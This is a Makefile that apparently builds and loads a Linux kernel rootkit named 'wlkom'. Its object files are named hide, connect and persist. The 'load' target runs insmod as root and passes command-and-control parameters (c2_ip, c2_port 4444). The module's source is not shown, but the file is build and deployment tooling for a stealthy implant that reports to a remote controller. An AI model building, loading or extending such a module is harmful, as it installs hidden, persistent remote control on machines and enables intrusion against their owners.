obj-m += wlkom.o

wlkom-objs := main.o hide.o connect.o persist.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
    make -C $(KDIR) M=$(PWD) modules

clean:
    make -C $(KDIR) M=$(PWD) clean

load:
    sudo insmod wlkom.ko c2_ip="192.168.1.1" c2_port=4444

unload:
    sudo rmmod wlkom
